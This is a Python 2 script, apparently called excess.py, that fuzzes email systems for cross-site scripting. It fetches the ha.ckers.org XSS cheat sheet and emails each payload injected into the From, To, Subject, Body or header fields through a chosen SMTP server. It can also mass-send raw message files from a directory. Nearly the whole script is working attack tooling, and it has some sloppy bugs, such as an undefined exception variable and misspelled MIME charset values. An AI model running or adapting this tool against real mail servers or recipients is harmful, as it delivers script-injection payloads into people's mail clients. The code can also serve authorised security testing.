#! /usr/bin/env python

import smtplib
import sys
import optparse
import urllib2
from xml.dom.minidom import parse, parseString
import HTMLParser
import os


MAIL_SERVER = None
MAIL_PORT = 25
MAIL_FROM = ""
MAIL_TO = ""
XSS_SHEET="http://ha.ckers.org/xssAttacks.xml"
XSS_DOM = None
ATTACK_TYPE = "XSS"
ATTACK_SUB_TYPE = "ALL"
USE_MIME=1
HEADERS = ""
SMTPOBJ  = None
INIT_OK = False

def init_headers():
	HEADERS = "\n\n"

TEMPLATE="""From: $sender$
To: $recip$
Subject: $subj$
$headers$
$body$
"""
TEMPLATE_MIME="""If you can read this, you're client doesn't support MIME

--outer-boundary
Content-Type:text/plan; charset=us-asci

$textbody$

--outer-boundary
MIME-Version:1.0
Content-Type: text/html; charset=us-ascii
Content-Disposition: inline
Content-ID: <body@here>

$htmlbody$

"""
def striphtml(s):
	tag = False
	quote = False
	out = ""
	
	for c in s:
		if c == '<' and not quote:
			tag = True
		elif c == '>' and not quote:
			tag = False
		elif (c == '"' or c == "'") and tag:
			quote = not quote
		elif not tag:
			out = out + c
	return out

def buildmsg(_from,_to,_subject,_headers,_body,isHTML=True,isMime=False):
	global TEMPLATE
	global TEMPLATE_MIME
	tmphead = _headers
	body = TEMPLATE
	body = body.replace("$sender$", _from)
	body = body.replace("$recip$", _to)
	body = body.replace("$subj$", _subject)
	if not isMime:
		if isHTML:
			tmphead = tmphead + "Content-type: text/html\n"
		else:
			tmphead = tmphead + "Content-type: text/plain\n"
		body = body.replace("$body$", _body)
	else: #is Mime
		tmphead = tmphead + "Content-Type: multipart/alternative; boundary=\"outer-boundary\"\n"
		body = body.replace("$body$",TEMPLATE_MIME)
		body = body.replace("$textbody$",striphtml(_body))
		body = body.replace("$htmlbody$",_body)
	#set headers and send mail
	body = body.replace("$headers$", tmphead)
	return body

def sendrawmail(_from,_to,_msg):
	global SMTPOBJ
	if SMTPOBJ is None: exit(1)	
	SMTPOBJ.sendmail(_from,_to,_msg)

def main():
	global SMTPOBJ
	global XSS_SHEET
	global XSS_DOM
	global ATTACK_TYPE
	global MAIL_FROM
	global MAIL_TO
	try:
		SMTPOBJ = smtplib.SMTP(host=MAIL_SERVER,port=MAIL_PORT,local_hostname="excell3mail")
	except Exception, e:
		print "Failed to connect to " + MAIL_SERVER + "\n" + e.message
	
	if ATTACK_TYPE== "XSS":
		try:
			#try to get xss cheatsheet
			u1=urllib2.urlopen(XSS_SHEET)
			XSS_DOM = parse(u1)
			h = HTMLParser.HTMLParser()
		except Exception, e:
			print "Failed to retrieve XSS chreat sheet, exiting\n" + e.message
			exit(2)
		try:
			for node in XSS_DOM.getElementsByTagName("attack"):
				name = node.getElementsByTagName("name")[0].childNodes[0].nodeValue
				code = node.getElementsByTagName("code")[0].childNodes[0].nodeValue
				print "XSS TEST: " + name
				if ATTACK_SUB_TYPE == "ALL": 
					msg = buildmsg(h.unescape(code),h.unescape(code),h.unescape(code),"",h.unescape(code),True,True)
				#body
				elif ATTACK_SUB_TYPE == "BODY":
					msg = buildmsg(MAIL_FROM, MAIL_TO,"In Body " + name,"",h.unescape(code),True,True)
				elif ATTACK_SUB_TYPE == "SUBJECT":
					msg = buildmsg(MAIL_FROM, MAIL_TO,h.unescape(code),"","In Subject " + name,True,True)
				elif ATTACK_SUB_TYPE == "FROM":
					msg = buildmsg(h.unescape(code),MAIL_TO,"In From " + name,"","In From " + name,True,False)
				elif ATTACK_SUB_TYPE == "TO":
					msg = buildmsg(MAIL_FROM,h.unescape(code),"In To " + name ,"","In To " + name,True,False)
				elif ATTACK_SUB_TYPE == "HEADER":
					msg = buildmsg(MAIL_FROM, MAIL_TO,"In Extra Header " + name ,h.unescape(code),"In Extra Header " + name,True,False)				
				sendrawmail(MAIL_FROM, MAIL_TO, msg)
		except Exception, e2:
			print "Error sending mail: \n" + e.message
			exit(2)
	elif ATTACK_TYPE=="DIR":
		if os.path.exists(ATTACK_SUB_TYPE):
			path = ATTACK_SUB_TYPE
			if path[len(path)-1:]!="/": path=path+"/"
			for dirpath, dirs, files in os.walk(ATTACK_SUB_TYPE):
				for lfile in files:
					f = open(path+lfile)
					msg = f.read()
					f.close()
					msg= msg.replace("$from$",MAIL_FROM)
					msg = msg.replace("$to$",MAIL_TO)
					msg = msg.replace("$subject$",lfile)
					sendrawmail(MAIL_FROM, MAIL_TO, msg)
					print "Sent file: " + lfile
		else:
			print "Invalid folder specified for --param :" + ATTACK_SUB_TYPE
def init():
	#argument parsing
	global MAIL_SERVER
	global MAIL_PORT
	global MAIL_FROM
	global MAIL_TO
	global ATTACK_TYPE
	global ATTACK_SUB_TYPE
	global USE_MIME
	global INIT_OK
	try:
		parser = optparse.OptionParser(usage = """
Command Line:
-------------
%prog -s smtp_server -f from -t to -a [XSS or DIR] --param [XSS: Fieldname, DIR: path]

XSS:
----
-a XSS is the default, will retireve XML containing XSS exploits from http://ha.ckers.org/xssAttacks.xml
--param decides which field will be injected can be set to ALL (default), FROM, TO, SUBJECT,BODY or HEADER.

DIR:
-----
-a DIR will read all files in a directory and email them. The files must contain a full message including headers. Values $from$ $to$ and $subject$ will be replaced with their correspondingv alue when specified.
--param the directory which will be read
""")
		parser.add_option("-s", default=None, dest="smtp_server")
		parser.add_option("-p", default=25, dest="smtp_port")
		parser.add_option("-f", default="excell3@nowhere.org", dest="smtp_from")
		parser.add_option("-t", default=None, dest="smtp_to")
		parser.add_option("-a", default="XSS", dest="attack_type")
		parser.add_option("--param", default="ALL", dest="attack_sub_type")#XSS:all,to,from,subject,body,header FOLDER: folder
		options, args = parser.parse_args()
		if not options.smtp_server :
			print "Option -s is mandatory"
			exit(2)
		if not options.smtp_to :
			print "Option -t is mandatory"
			exit(2)
		MAIL_SERVER = options.smtp_server
		MAIL_PORT = int(options.smtp_port)
		MAIL_FROM = options.smtp_from
		MAIL_TO = options.smtp_to
		USE_MIME = True
		#todo
		ATTACK_TYPE = options.attack_type.upper()
		ATTACK_SUB_TYPE = options.attack_sub_type
		if ATTACK_TYPE != "DIR": ATTACK_SUB_TYPE=ATTACK_SUB_TYPE.upper()
		INIT_OK=True
	except Exception, e:
		print e#.message
		print 'excess.py -s smtp_server -f from -t to -a [XSS or DIR] --param [XSS: Fieldname, DIR: path]'
		sys.exit(2)
	except KeyboardInterrupt:
		pass

if __name__ == "__main__":
	init()
	if INIT_OK==True: main()

